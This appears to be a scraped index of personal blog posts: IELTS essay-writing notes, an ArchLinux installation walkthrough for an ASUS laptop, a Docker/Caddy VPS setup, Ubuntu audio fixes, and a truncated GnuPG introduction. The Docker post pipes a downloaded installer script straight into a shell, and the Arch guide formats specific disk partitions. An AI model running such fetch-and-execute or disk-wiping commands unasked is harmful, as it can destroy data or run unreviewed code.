attitude is a vital component of success in sports. In fact, some people argue that mental attitude is even more important than physical fitness.\nLogic chain writing: Concurrent and / or as well as as well as do\u0026hellip; as well as doing\u0026hellip; not only but also / while Both before and after are complete sentences. Report Write Report essay sub paragraph first sentence Report: 1+2+1 The main reason / consequence for X is\u0026hellip; To address / combat this issue, A and B should take on / assume the responsibility / take appropriate measures. Report: 1+3+1 One reason / consequence for X is\u0026hellip; To address this issue, A and B should take on the responsibility / take appropriate measures. Moreover, A and B should also do\u0026hellip; Write Report essay sub paragraph second sentence There are several reasons for this trend. In this essay, I will explore / discuss the causes of X, and what can be done to reduce its effects. Ending Same as previous. Complete Report Example The natural resources are being exploited and consumed by humans without stops. In this essay, I will explore the causes of consequences of X, and what can be done to reduce its effects.\nThe main impacts of the overconsumption of natural resources is the degradation of the overall ecosystems.\nTo combat this issue, it is crucial for government to take on its responsibility.\nIn conclusion, given the disastrous consequences of depleting natural resources, it is crucial for governments to play a key role in ensuring their sustainable use and protection for future generations.\nMixture Characteristics Why does this happen? Do you think it is a positive or negative development Write Mixture essay sub paragraph first sentence Mixture: 1+3+1 One reason for X is\u0026hellip; Moreover, another reason for X is.. However, I think X can also bring negative effects to.. Write Mixture overview paragraph I believe X is beneficial / harmful for\u0026hellip; Complete Mixture Example Some parents tend to exert excessive pressure on their children. I believe it is generally a positive trend.\nOne reason for this trend concerns the education.\nMoreover, another reason for such a trend is that it can help children regulate their own behaviour.\nHowever, as for me, too much pressure can leave children with little time to enjoy their hobbies.\nIn conclusion, many parents choose to put pressure on their children in order to help them become knowledgeable and responsible individuals who can better adapt to society. While this can have its benefits, I believe too much pressure can also prevent children from pursuing their true interests.\n","date":"2023-06-30T16:00:00+08:00","image":"https://cdn.statically.io/gh/Misakaou/imagestorage@master/20230630/IELTS-Writing-Course-Note-04-Compare(Outweigh)-and-Report-Essay.3sgs2f8b61kw.webp","permalink":"https://blog.moeomu.com/posts/ielts-writing-course-note-04-compareoutweigh-and-report-essay/","title":"IELTS Writing Course Note 04 Compare(Outweigh) and Report Essay"},{"content":"Source of this article: MoeomuBlog\nSegmentation method Stating the first preconceived idea. Stating the second preconceived idea. Give our own opinion. Write sub-argument paragraph first sentence First, some people argue that + first preconceived idea.\nTo begin with, they believe that\u0026hellip; For another, they also claim that\u0026hellip; However, other people argue that + second preconceived idea.\nOn the one hand, it could be argued by other people that\u0026hellip;\nOn the other hand, a different perspective / proponent / opponent is held by others who believe that\u0026hellip;\nUse persona People first person: we third person: people / individuals / everyone Specific people avoid singular person Logic chain writing: Enumeration Grammar rules 2 items tied: A and B 3 items tied: A, B, and C Attention Instead of using etc., use and other X (related) Sth. e.g.: obesity, heart diseases, and other health related issues. Connect such as I don\u0026rsquo;t like people such as him. I like my pets, such as the white dog and black cat. include SVO, including A, B, and C SVO. This may / can include A, B, and C A and B are two ways Encouraging innovation and investing in education are two possible ways. : SVO: SVO. SVO: noun. SVO: A, B, and C. A, B, and C \u0026ndash; C. , SVO, SVingO. / Error e.g.: SVO, SVO. (run-on) imaging (imperative sentence) Imaging + Noun. e.g.: Imaging a student, who..\nImaging that + sentence. e.g.: Imaging that a literature student\u0026hellip;\nwhile Logic chain writing: Concession although / while Although SVO, SVO. in spite of / despite / notwithstanding despite noun, SVO. despite the fact that + Homophobic clauses, SVO. nonetheless / nevertheless admittedly Admittedly / we need to admit that\u0026hellip; It is true that\u0026hellip; There is no denying that\u0026hellip; Write First and Ending paragraph First sentence There are two different perspectives regarding X. There has been a conflict about X. Give opinion I am more inclined to agree with A. I have a stronger inclination towards concurring with A. I believe there is a way to resolve this conflict. I believe a resolution to this conflict can be achieved. In my opinion, X can also bring benefits / harmful impacts to\u0026hellip; In my opinion, there are other positive / negative impacts of X to consider. In my opinion, while X may have negative effects, they can be overcome with solutions. I hold the view that both opinions all have their merits. Form my perspective, there are benefits to be found in both opinions. e.g.: In conclusion, while advertising have some drawbacks, since it can bring positive effects to the economy, including promoting both innovation and employment, I believe it is generally beneficial to the society as a whole.\ne.g.: In my opinion, while advertisement may have fore mentioned negative effects, solutions are available to overcome these issues. In conclusion, despite the harmful effects of some types of advertisement, I believe that the government can take appropriate measures to address these issues and ensure that advertising is conducted in a responsible and beneficial manner for the public.\n","date":"2023-06-29T16:00:00+08:00","image":"https://cdn.statically.io/gh/Misakaou/imagestorage@master/20230630/IELTS-Writing-Course-Note-03-Discuss-Essay.573jmp76c1kw.webp","permalink":"https://blog.moeomu.com/posts/ielts-writing-course-note-03-discuss-essay/","title":"IELTS Writing Course Note 03 Discuss Essay"},{"content":"Source of this article: MoeomuBlog\nWrite first sentence of paragraph 1+2+1 Lopsided First, one argument for / in favour of X is\u0026hellip; Second, another argument for / in favour of X is\u0026hellip; 1+2+1 Neutral First, one argument for / in favour of X is\u0026hellip; However, one argument against X is\u0026hellip; Replace Argument reason point Whole sentence there be However, there are also arguments against X.\nHowever, there are also counterargument to X.\nX can also bring benefit / harmful impact to\u0026hellip;\nusage: MUST NOT in first paragraph Needed Pronoun this use alone: refers to whole sentence this + special content: refers to special detail that do not use these refers to plural noun those those + who\u0026hellip;: This can lead to a widening of the gap between those who have the access to the internet and those who do not. such similar to this but cannot refers to whole sentence, such = this + those usage such + plural noun: such approaches such + a / an + singular noun: such an approach such + adj. + noun: such helpful approaches so Logic chain writing: Conditional relationships if Recycling of waste is made mandatory by law. This can drive people to comply.\nIf recycling of waste is made mandatory by law, people will comply.\nreplace IF provided that on condition that extend the logic chain If SVO, SVO, leading to\u0026hellip; If A occurs, but not -A, then B occurs. Conversely, B does not occur. e.g.: If the recycling of waste is made mandatory by law, people are more likely to comply. e.g.: If the recycling of waste is made mandatory by law, rather than through willingness, people are more likely to comply. Otherwise, the waste will be disposed in a careless manner. Only if / As long as No matter what replace when where examples People can easily find information they need on the internet, no matter what their field of study is. People can easily find information they need on the internet no matter / regardless of their field of study. Whether examples People can easily find information they need on the internet, whether their field of study is art or science. People can easily find information they need on the internet regardless of their field of study, whether they are major in science, art, or any other subjects. whether be \u0026hellip; whether it (should) be in science\u0026hellip; be it in science, art, or\u0026hellip; Extend logic chain A can do X. -\u0026gt; A can do X. In particular / especially, A1, can do better. A can do X. -\u0026gt; A can do X. In particular, A1, who / which has certain characteristic, more likely to do X. A can do X. -\u0026gt; This is especially true / beneficial / harmful for A1. + who + certain characteristic Write overview Part synonymic rewriting the topic write general view Argumentative topics Attitudes are given for each of the two branches of opinion. First, write disagree branch, then, write agree branch. Attention: There is no need to repeat the topic, because they are merge with each other.\nExample While learning about local history is beneficial for students, I believe that being knowledgable of world history is also necessary in the modern age.\nWrite ending same as Lesson1 ","date":"2023-06-28T16:00:00+08:00","image":"https://cdn.statically.io/gh/Misakaou/imagestorage@master/20230630/IELTS-Writing-Course-Note-02-Opinion-Essay.3io6hcc5uji8.webp","permalink":"https://blog.moeomu.com/posts/ielts-writing-course-note-02-opinion-essay/","title":"IELTS Writing Course Note 02 Opinion Essay"},{"content":"Source of this article: MoeomuBlog\nWrite the first word Yes, we can write \u0026ldquo;First, Second, Third\u0026hellip;\u0026rdquo;, it is simple but not affective the score. For a paragraph First / Firstly / First of all Second / Secondly / Moreover / Furthermore Third / Thirdly / Lastly / At last For a subargument To begin with / One concern / Specifically / Primarily Additionally / In addition / Moreover / Furthermore / What\u0026rsquo;s more / Another concern / Also / For another Write first sentence of paragraph Respond to agree or disagree / positive or negative\nFor 1+2+1 lopsided views First, one positive aspect of X is... Moreover, another positive aspect of X is... / Moreover, X can also bring another benefit to... For 1+2+2 neutral views First, one positive aspect of X is... However, one negative aspect of X is... or However, it is important to note / acknowledge the negative aspect of X. For 1+3+1 neutral views First, one positive aspect of X is... Moreover, X can also bring a benefit to... However, it is important to acknowledge the negative aspect of X. For 1+3+1 lopsided views(cause problem) First, one positive aspect of X is... Moreover, another positive aspect of X is... or Moreover, X can bring a further benefit to... Lastly, yet another positive aspect of X is... More examples benefit usages: X can bring benefits to / X has the benefit for / X is beneficial for / X can benefit\ndisadvantages usages:\nX has disadvantages / drawbacks / shortcomings related to X can have negative / adverse effects / impacts on X can negatively impact X can be harmful / detrimental / damaging to Write our own views Do not give direct result First, one positive aspect of promoting public transportation is the improved convenience and effectiveness of the residents\u0026rsquo; living.\nUsing the Argumentative Corpus and Advanced Vocabulary. Download file: IELTS-Essay-Corpus.zip Using necessary documents (Chinese) Watching Videos (Chinese) More generalized sentences First, one positive aspect of promoting public transportation is related to / associated with / concerns people\u0026rsquo;s daily lives. By doing this, the convenience and effectiveness of the residents\u0026rsquo; mobility can be greatly enhanced.\nLogic chain writing: Causality because inA, because B, A is more important\nsince in A, since B, B is more important\nlead: in A lead to B SVO. This can lead to A, leading to B., same importance Government increased the capacity of the road network. This can lead to more room for cars to travel, leading to an increased efficiency of traffic flow as a result. Because SVO, SVO, leading to... By doing sth., SVO, leading to... SVO, leading to / which can lead to + Result, SVO is more important Synonyms SVO, resulting in sth. SVO, allowing / enabling sb. to do sth. SVO, contributing to\u0026hellip; SVO, encouraging / driving / motivating sb. to do sth. SVO, which plays an important role in doing sth. SVO, promoting / reducing\u0026hellip; SVO, strengthening / weakening\u0026hellip; SVO, making it easier / more difficult to do\u0026hellip; factor, A lead to B. = A is a contributing factor to B. = A is a factor that contributes to B. therefore / as a result / consequently Usage: Lead a complete sentence, SVO. Therefore, SVO. Conclusion: Highly summative. thus / in turn / thereby Usage: Append to sentences that already have a cause-and-effect relationship to further enhance the tone. SVO. This, in turn, can lead to... or SVO, thus leading to... which means Usage: Lead a cause-and-effect relationship. SVO, which means (that) + Result(complete sentence) By increasing the capacity of the road network, there are more room for cars to travel, which means this approach can increase the efficiency of traffic flow as a result. Write overview 100% / 70% / 50% I believe that this is a completely positive / negative trend. I believe that this is generally a positive / negative trend. I believe that this trend has both positive and negative sides. advantages and disadvantages. benefits and drawbacks. Specific Personal on a personal level on a societal level on an environmental level on an educational level Life on the level of daily life Write ending paragraph In conclusion, X can bring benefits in terms of A and B. However, it is also crucial to acknowledge the potential negative impacts. This can include C and D.\n","date":"2023-06-27T16:00:00+08:00","image":"https://cdn.statically.io/gh/Misakaou/imagestorage@master/20230630/IELTS-Writing-Course-Note-01-Disadvantage-and-Advantage-Essay.1t76xiwq5tx.webp","permalink":"https://blog.moeomu.com/posts/ielts-writing-course-note-01-disadvantage-and-advantage-essay/","title":"IELTS Writing Course Note 01 Disadvantage and Advantage Essay"},{"content":"Source of this article: MoeomuBlog\nIntroduction to this article Asus Strix ScarG532\nIf you have the same machine as I do then you can follow this article exactly step by step and you will definitely end up with a successful installation of ArchLinux. I will exhaustively link the reference next to it so you can view and modify it to the configuration you want. This note above is against the Arch way, so I am kidding. Please do not follow the configuration below step by step, and if you encounter the same problem as I did, you can refer to my solution The components I have installed are as follows Secure boot component: PreLoader Bootloader: systemd-boot Network and DHCP service: NetworkManager (because of better integration with Gnome) Desktop environment: Gnome based on Wayland Chinese input: ibus-libpinyin based on ibus (because of better integration with Gnome) Installing ArchLinux This section follows exactly the Installation guide - ArchWiki, you can check this official documentation link for a more detailed explanation\nPre-installation Boot disk creation You can visit the Download - ArchLinux page to get the official boot image Once downloaded, it is recommended to use balenaEtcher to write the image to a USB stick Boot the created ArchLinux installation environment from the USB stick These three steps are too simple so do not repeat, if you need help please leave a message in the comments section\nVerify UEFI mode boot Execute the command ls /sys/firmware/efi/efivars, if there is an output value then it proves that it is UEFI mode boot, later in the article the bootloader will use UEFI\nCheck and connect to the network The following section will use the wireless card for network connection\nRun rfkill, if the output is as follows then the hardware is fine 1 2 3 ID TYPE DEVICE SOFT HARD 0 bluetooth hci0 unblocked unblocked 1 wlan phy0 unblocked unblocked Execute iwctl to enter the network connection configuration tool interface, see iwctl - ArchWiki for more details Execute device list to view the list of devices Execute station wlan0 scan to scan with wlan0 devices Execute station wlan0 get-networks to see the list of scanned networks Execute station wlan0 connect SSID to connect to the network Execute ping archlinux.org to check network connectivity calibrate the time systemd-timesyncd will automatically calibrate the time when it detects a network connection, so there is no need to manually calibrate the time\nRun timedatectl status to check and make sure the system time is correct disk operations (data is priceless, be careful) This section must not be copied, you may have a different number of disks than I do, and your disk partition situation must be different than mine\nBe sure to refer to Partition the disks - ArchWiki for disk partitioning\nRun fdisk -l to see how your disk is partitioned, and partition it as you see fit Execute fdisk /dev/nvme0n1 for the first SSD operation, press m to show help, save and exit the fdisk interface after the operation is finished, this tool will write to the hard disk partition table only when it is saved, please feel free to operate it (Danger) Execute mkfs.ext4 /dev/nvme0n1p4 to format the fourth partition of the first SSD, in this case it will be the mount point of / (Danger) Execute mkfs.ext4 /dev/nvme2n1p1 to format the first partition of the third SSD, which in this case will be the mount point of /home. Execute e2label /dev/nvme0n1p4 \u0026quot;ArchSys\u0026quot; to set the label of the fourth partition of the first SSD to ArchSys, which will be used by systemd-boot Execute e2label /dev/nvme2n1p1 \u0026quot;ArchData\u0026quot; to set the label of the first partition of the third SSD to ArchData, which will be used by systemd-boot Execute blkid | grep Arch to check the disk label setting Execute mount /dev/nvme0n1p4 /mnt to mount the disk, it will be / Execute mount --mkdir /dev/nvme0n1p1 /mnt/boot to mount the disk, it will be /boot Execute mount --mkdir /dev/nvme2n1p1 /mnt/home to mount the disk, it will be /home Execute mkswap /dev/nvme0n1p5 to format the fifth partition of the first SSD as a memory swap partition Execute swapon /dev/nvme0n1p5 to enable the memory swap partition Start installation change the address of the selected mirror vim is a command line text editor, if you don\u0026rsquo;t know how to use it, you can switch to nano, if you are already in the vim interface, you can exit vim in normal mode by typing an English colon and q\nExecute vim /etc/pacman.d/mirrorlist to edit the installation source image list Add this line Server = https://mirrors.ustc.edu.cn/archlinux/$repo/os/$arch to the top, or you can follow your own custom to install the necessary packages intel-ucode is the microcode update package for intel, recommended to install\nExecute pacstrap -K /mnt base linux linux-firmware intel-ucode to install the system base package Execute pacstrap /mnt networkmanager bluez vim sudo bash-completion openssh man git wget zsh to install some software you need Configure the new system Execute genfstab -U /mnt \u0026gt;\u0026gt; /mnt/etc/fstab to create a system partition table definition Execute arch-chroot /mnt to switch the shell to the new system and execute the command Execute ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime to set the system time zone to Asia-Shanghai Execute hwclock --systohc to synchronize the hardware time Execute vim /etc/locale.gen to edit the system\u0026rsquo;s localization settings, my settings are as follows, which can be used as a reference. Note: If you don\u0026rsquo;t add zh_CN.UTF-8 UTF-8 in this step, then you won\u0026rsquo;t find Pinyin input in Gnome\u0026rsquo;s Keyboard option 1 2 en_US.UTF-8 UTF-8 zh_CN.UTF-8 UTF-8 Execute locale-gen to generate localization settings Execute vim /etc/locale.conf to edit the language configuration file, I use English system, enter LANG=en_US.UTF-8, if you use Chinese system, change it to LANG=zh_CN.UTF-8 Execute vim /etc/hostname to edit this host name Execute mkinitcpio -P to create a boot memory initialization image Execute passwd to change the root user password Configure system startup items Execute bootctl --path=/boot install to install systemd-boot into /boot Execute systemctl enable systemd-boot-update.service to start systemd-boot\u0026rsquo;s automatic update service Execute vim /boot/loader/loader.conf to edit the systemd-boot startup configuration file 1 2 3 4 5 6 default archlinux.conf timeout 2 console-mode max editor no auto-entries 1 auto-firmware 1 Execute vim /boot/loader/entries/archlinux.conf to edit ArchLinux boot entries 1 2 3 4 5 title Arch Linux linux /vmlinuz-linux initrd /intel-ucode.img initrd /initramfs-linux.img options root=\u0026#34;LABEL=ArchSys\u0026#34; rw quiet splash Execute vim /boot/loader/entries/arch-fallback.conf to edit the ArchLinux-Fallback boot entry 1 2 3 4 5 title Arch Linux (fallback initramfs) linux /vmlinuz-linux initrd /intel-ucode.img initrd /initramfs-linux-fallback.img options root=\u0026#34;LABEL=ArchSys\u0026#34; rw quiet splash Other Execute systemctl enable NetworkManager.service to make NetworkManager\u0026rsquo;s service start on boot Execute systemctl enbale bluetooth.service to make the Bluetooth service start on boot Execute exit to exit the new system environment Execute reboot to reboot the system Hint: You can actually end up here, but if you use it as a primary system, ArchLinux as it is now is clearly not up to the task, so here is more software installation reference\nMore installation configurations Connecting to the network Using the NetworkManager command line tool\nExecute nmcli device wifi list to see the wifi list Execute nmcli device wifi connect SSID_or_BSSID password your_password to connect to the network Execute nmcli connection show to see the current connection You can see more usage in the nmcli example - ArchWiki article\nCreate a new user Execute useradd -m misaka to create a new user named misaka Execute export EDITOR=vim \u0026amp;\u0026amp; visudo to edit this file and follow the prompts to add the new user to the privileged users group, so that the new user can use sudo for privileged operations normally Execute usermod -a -G wheel misaka to add the misaka user to the wheel user group, the advantage of this is that Gnome can correctly identify the privileges of this new user, and the authentication of this user name will pop up by default when doing root privileges in Gnome Execute passwd misaka to change the password of the new user Install Gnome GUI Hint: The command below is written to install a lot of software because there are a lot of software in the Gnome package that I don\u0026rsquo;t need, so I have to manually select the software I want to install, or you can use the simpler pacman -S gnome instead of the installation command below, as you like\nExecuting the following command will install the base components of Gnome pacman -S file-roller gdm gedit gnome-backgrounds gnome-calculator gnome-control-center gnome-disk-utility gnome-logs gnome-menus gnome- settings-daemon gnome-shell gnome-shell-extensions gnome-software gnome-system-monitor gnome-terminal gvfs nautilus seahorse seahorse- nautilus xdg-user-dirs-gtk If the installation gives you a choice between using jack2 or pipewire, choose pipewire. This is the system\u0026rsquo;s sound service.\nRun systemctl enable gdm.service to make the Gnome login screen boot up and self start, it will start Gnome on the next reboot Install Chinese input method and fonts Execute pacman -S ttf-dejavu wqy-zenhei wqy-microhei adobe-source-han-sans-cn-fonts adobe-source-han-serif-cn-fonts to install Chinese fonts Execute ibus ibus-libpinyin to install ibus and ibus\u0026rsquo; Smart Pinyin input method Reboot and login as normal user Execute reboot Start Terminal Gnome window control button settings Execute gsettings set org.gnome.desktop.wm.preferences button-layout \u0026quot;close,minimize,maximize:\u0026quot; which will show all windows close, minimize and maximize buttons and put them on the left side NVIDIA driver settings Warning: Do not reboot while this section is running\nRun sudo pacman -S nvidia nvidia-settings to install the NVIDIA driver and setup program It will change the default window system from Wayland to X11, if you want to continue using Wayland as the window system, please execute the following command\nExecute sudo ln -s /dev/null /etc/udev/rules.d/61-gdm.rules to disable udev\u0026rsquo;s rules for disabling Wayland in GDM Execute gsettings set org.gnome.mutter experimental-features '[\u0026quot;kms-modifiers\u0026quot;]' to enable kms-modifiers for gsettings Execute sudo vim /boot/loader/entries/archlinux.conf to edit the boot entry and change the last line to options root=\u0026quot;LABEL=ArchSys\u0026quot; rw quiet splash nvidia-drm.modeset=1 Run sudo vim /etc/mkinitcpio.conf to edit modsettings to change MODULES=() to nvidia nvidia_modeset nvidia_uvm nvidia_drm and save the file. For more help information please refer to DRM_kernel_mode_setting - ArchWiki Execute sudo mkinitcpio -P Reference source for this section: Use Wayland with proprietary NVIDIA drivers - Manjaro Forum\nSecure Boot Reference source for this section: Unified Extensible Firmware Interface/Secure Boot - ArchWiki\nDownloaded from Linux Foundation Secure Boot System Release - James Bottomley\u0026rsquo;s Random Page PreLoader.efi and HashTool.efi If you configured them as above, then copy these two files to your /boot/EFI/systemd directory Rename /boot/EFI/systemd/systemd-bootx64.efi to /boot/EFI/systemd/loader.efi. 1 2 cp your_download_path/{PreLoader,HashTool}.efi esp/EFI/systemd cp esp/EFI/systemd/systemd-bootx64.efi esp/EFI/systemd/loader.efi Run sudo pacman -S efibootmgr to install efibootmgr Please note that maybe your disk is different from mine, run sudo efibootmgr --verbose --disk /dev/nvme0n1 --part 1 --create --label \u0026quot;Arch Linux Security Boot\u0026quot; --loader /boot/EFI/ systemd/PreLoader.efi adds an NVRAM boot entry Install the Gnome extensions Run flatpak install com.mattjakeman.ExtensionManager to install Gnome Extension Manager Search for and install the following extensions in the Gnome Extension Manager and configure them TrayIcons: reinstall (highly recommended) Blur My Shell Gnome Clipboard Compiz similar magic light effect Run to the dock No activity button Open Weather Privacy quick settings menu Vital Signs Other issues The following section will use the Aur software repository, which can be found in Aur - ArchLinux for more information.\nparu is an Aur repositories utility that automatically fetches programs within the installed Aur repositories, visit Morganamilo/paru - Github to see how to install and use paru.\nGnome can\u0026rsquo;t mount NTFS external disk properly It may be that gvfs in Gnome needs to use some utilities in ntfs-3g to mount NTFS disks properly. ntfs driver is built in after Linux kernel version 5.15, so you can install ntfs utilities using kernel ntfs driver separately with the above command.\nExecute paru ntfsprogs-ntfs3 No sound This section references.\nProblem summary of installing Ubuntu on AsusStrixScarG532 - MoeomuBlog ASUS ROG G533QS - ArchWiki There are two solutions above, please use which one according to your preference\nGPG problem Reference for this section: GnuPG - ArchWiki\nioctl error Guide: Invalid_IPC_response_and_Inappropriate_ioctl_for_device - ArchWiki\nAdd export GPG_TTY=$(tty) to environment variables such as .bashrc, .zshrc, etc. configure pinentry as Gnome3 style Failure to do so will cause GPG to fail to find the GUI password entry program, which in turn will cause more GUI program errors\nExecute echo pinentry-program /usr/bin/pinentry-gnome3 \u0026gt;\u0026gt; .gnupg/gpg-agent.conf Keyboard lighting and power control read more at ASUS Linux\nExecute paru asusctl Execute paru rog-control-center Reference [HowTo] Use Wayland with proprietary NVIDIA drivers. (2022, February 10). Manjaro Linux Forum. https://forum.manjaro.org/t/howto-use-wayland-with-proprietary-nvidia-drivers/36130 Arch Linux - Downloads. (n.d.). Archlinux.org. https://archlinux.org/download/ Arch Linux 源使用帮助 — USTC Mirror Help 文档. (n.d.). Mirrors.ustc.edu.cn. Retrieved October 26, 2022, from https://mirrors.ustc.edu.cn/help/archlinux.html ASUS NoteBook Linux. (n.d.). Asus-Linux.org. Retrieved October 26, 2022, from https://asus-linux.org/ ASUS ROG G533QS - ArchWiki. (n.d.). Wiki.archlinux.org. Retrieved October 26, 2022, from https://wiki.archlinux.org/title/ASUS_ROG_G533QS AUR (en) - Home. (n.d.). Aur.archlinux.org. https://aur.archlinux.org/ balenaEtcher - Home. (2020). BalenaEtcher. https://www.balena.io/etcher/ GnuPG - ArchWiki. (2018). Archlinux.org. https://wiki.archlinux.org/title/GnuPG Installation guide - ArchWiki. (n.d.). Wiki.archlinux.org. https://wiki.archlinux.org/title/Installation_guide iwd - ArchWiki. (n.d.). Wiki.archlinux.org. Retrieved October 26, 2022, from https://wiki.archlinux.org/title/Iwctl Linux Foundation Secure Boot System Released | James Bottomley’s random Pages. (n.d.). Retrieved October 26, 2022, from https://blog.hansenpartnership.com/linux-foundation-secure-boot-system-released/ Lulu. (2022, October 26). Paru. GitHub. https://github.com/Morganamilo/paru Misaka. (2022, October 20). Problem summary of installing Ubuntu on AsusStrixScarG532. Moeomu Blog. https://blog.moeomu.com/posts/problem-summary-of-installing-ubuntu-on-asusstrixscarg532/#system-sound-problems NetworkManager - ArchWiki. (n.d.). Wiki.archlinux.org. https://wiki.archlinux.org/title/NetworkManager NVIDIA - ArchWiki. (n.d.). Wiki.archlinux.org. Retrieved October 26, 2022, from https://wiki.archlinux.org/title/NVIDIA Unified Extensible Firmware Interface/Secure Boot - ArchWiki. (n.d.). Wiki.archlinux.org. https://wiki.archlinux.org/title/Unified_Extensible_Firmware_Interface/Secure_Boot ","date":"2022-10-26T19:14:09+08:00","image":"https://cdn.statically.io/gh/Misakaou/imagestorage@master/20221026/00002-1464201810-install-system,-webpage-head-image,-beautiful,-ArchLinux.6mm7o4tdu64g.webp","permalink":"https://blog.moeomu.com/posts/installing-archlinux-on-asus-rog-strix-scar-g532/","title":"Installing ArchLinux on ASUS ROG Strix Scar G532"},{"content":"Source of this article: MoeomuBlog\nPre Introduction There are some open source services that I really want to experience, but can not be deployed on a service like Paas, or can be deployed but can not persistently store some files. So not long ago, I bought a VPS, considering the security of the use of Docker to deploy all services, and the local reverse proxy using Caddy, and Caddy through the Cloudflare API automatically from the Cloudflare CDN protected DNS resolution under the acquisition and renewal of HTTPS certificates. The following is the entire process of deploying my service, if there are errors and omissions please be sure to point out. This article will not go into detail to each command, but describe a general idea of the framework for building. Warning: If you ignore the advice to read the official documentation in specific paragraphs of this article and execute the next commands directly, there is a high probability that you will make a mistake. At this point, you can go through the official documentation mentioned in that paragraph, or ask questions in the comments section of this article.\nCreate Docker basic service framework Create a user Run the following command\n1 2 3 4 useradd -m mydocker usermod -s /bin/bash mydocker su mydocker curl -fsSL https://get.docker.com/rootless | sh Follow Docker\u0026rsquo;s official Run the Docker daemon as a non-root user (Rootless mode) - Docker Document guide Configure the configuration items you want\nCreate a Docker network docker network create caddy Deploy the web service Deploy the Alist service Alist\u0026rsquo;s Github open source address: alist - Github\nAlist deployment commands -d means run in the background --name specifies the name of this Docker service -p host port:container port specifies the port to bind to --network=caddy indicates the bound Docker Network -v host path:container path specifies the location of the file to be stored permanently --restart=always indicates that the service is down for restart. 1 2 3 4 5 6 docker run -d --name=\u0026#34;alist\u0026#34; \\ -p 5244:5244 \\ --network=caddy \\ -v $HOME/docker_data/alist:/opt/alist/data \\ --restart=always \\ xhofe/alist:latest More Alist reference commands View Alist password: docker exec -it alist . /alist password View Alist logs: docker logs -f alist Deploy Whoogle service Deploy the following commands, the details of which are not explained, and are the same as above 1 2 3 4 5 docker run -d --name whoogle \\ -p 5000:5000 \\ --network=caddy \\ --restart=always \\ benbusby/whoogle-search:latest Deploying Caddy Prerequisites Before deploying the Caddy service using Docker, you need to create the required Caddyfile configuration file for the Caddy service to use for automatic configuration.\nCaddyfile Create the permanent storage location: mkdir -p $HOME/docker_data/caddy/ Create and edit the Caddyfile file: vim $HOME/docker_data/caddy/Caddyfile Caddyfile\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 (site_config) { tls me_tls@example.com { dns cloudflare {env.CLOUDFLARE_API_TOKEN} } # more config reverse_proxy {args.0} } drive.example.com { import site_config alist:5244 } search.example.com { import site_config whoogle:5000 } Additional note: The reason why alist:5244 and whoogle:5000 work and are resolved properly is that all three containers exist in the same Docker Network, so they can be resolved by container name.\nDeploying Caddy with Docker The deployment command is as follows, the details of the command are not explained, it is the same as above The following special note is needed your_cloudflare_login_email@example.com replaced with your cloudflare account email your_cloudflare_api_token is replaced with your cloudflare api token, you can follow Create an API token - Cloudflare Docs guide to get your api token, note that when creating it here you must select Zone / DNS / Edit and Zone / Zone / Read permissions 1 2 3 4 5 6 7 8 9 10 11 docker run -d --name=\u0026#34;caddy\u0026#34; \\ -p 443:443 \\ --network=caddy \\ -v $HOME/docker_data/caddy/Caddyfile:/etc/caddy/Caddyfile \\ -v $HOME/docker_data/caddy/data:/data \\ -v $HOME/docker_data/caddy/config:/config \\ -e CLOUDFLARE_EMAIL=your_cloudflare_login_email@example.com \\ -e CLOUDFLARE_API_TOKEN=your_cloudflare_api_token \\ -e ACME_AGREE=true \\ --restart=always \\ slothcroissant/caddy-cloudflaredns:latest Reference Run the Docker daemon as a non-root user (Rootless mode). (2022, September 22). Docker Documentation. https://docs.docker.com/engine/security/rootless/ Docker Hub. (n.d.). Hub.docker.com. Retrieved October 24, 2022, from https://hub.docker.com/r/slothcroissant/caddy-cloudflaredns Unrecognized directive: dns. (2020, May 14). Caddy Community. https://caddy.community/t/unrecognized-directive-dns/8149/9 Server, C. W. (n.d.). Caddyfile Concepts - Caddy Documentation. Caddyserver.com. Retrieved October 24, 2022, from https://caddyserver.com/docs/caddyfile/concepts ","date":"2022-10-24T22:03:01+08:00","image":"https://cdn.statically.io/gh/Misakaou/imagestorage@master/20221026/00002-2908894140.26d7gclffj8g.webp","permalink":"https://blog.moeomu.com/posts/deploying-docker-services-on-a-vps/","title":"Deploying Docker services on a VPS"},{"content":"Source of this article: MoeomuBlog\nSystem sound problems No sound /etc/modprobe.d/alsa-base.conf Append a line at the end of this file:options snd-hda-intel model=asus-zenbook reboot Sound is not adjustable Description: The master volume is not adjustable, can only be mute or maximum.\nEdit /usr/share/pulseaudio/alsa-mixer/paths/analog-output.conf.common\nAdd the following to the front of [Element PCM]\n1 2 3 [Element Master] switch = mute volume = ignore Kill pulse audio daemon and it will automatically restart: pulseaudio -k\nNote: Do not run pulseaudio as root, otherwise the daemon will not close properly.\nSuspend problems Can\u0026rsquo;t wake up again after locking the screen Description: After locking the screen, the computer can\u0026rsquo;t wake up again. The hard drive and other hardware work fine, but the screen is all black.\ninstall laptop-mod-tools: sudo apt install laptop-mode-tools start laptop-mode-tools: sudo laptop_mode start add mutter debug environment variable, edit /etc/environment if in Ubuntu 22.04: MUTTER_DEBUG_ENABLE_ATOMIC_KMS=0 if in Ubuntu 22.10 and later: MUTTER_DEBUG_FORCE_KMS_MODE=simple reboot reference snd-hda-intel model for UBUNTU 20.04 installed in an ASUS ROG STRIX G15 (G512) - AskUbuntu Volume either muted or maxed out, nothing in between - ubuntu forums Blanked screen doesn\u0026rsquo;t wake up after locking - Launchpad ","date":"2022-10-20T13:22:01+08:00","image":"https://cdn.statically.io/gh/Misakaou/imagestorage@master/20221020/1880882405-install-Problem,-Ubuntu,-webpage-head-image.g4gmdlq05jc.webp","permalink":"https://blog.moeomu.com/posts/problem-summary-of-installing-ubuntu-on-asusstrixscarg532/","title":"Problem summary of installing Ubuntu on AsusStrixScarG532"},{"content":"Source of this article: MoeomuBlog\nIntroduction of GnuPG Official Introduction Source: GnuPG\nGnuPG is a complete and free implementation of the OpenPGP standard as defined by RFC4880 (also known as PGP). GnuPG allows you to encrypt and sign your data and communications; it features a versatile key management system, along with access modules for all kinds of public key directories. GnuPG, also known as GPG, is a command line tool with features for easy integration with other applications. A wealth of frontend applications and libraries are available. GnuPG also provides support for S/MIME and Secure Shell (ssh).\nSince its introduction in 1997, GnuPG is Free Software (meaning that it respects your freedom). It can be freely used, modified and distributed under the terms of the GNU General Public License .\nArguing that you don\u0026rsquo;t care about the right to privacy because you have nothing to hide is no different from saying you don\u0026rsquo;t care about free speech because you have nothing to say.\n– Edward Snowden\nUsing encryption helps to protect your privacy and the privacy of the people you communicate with. Encryption makes life difficult for bulk surveillance systems. GnuPG is one of the tools that Snowden used to 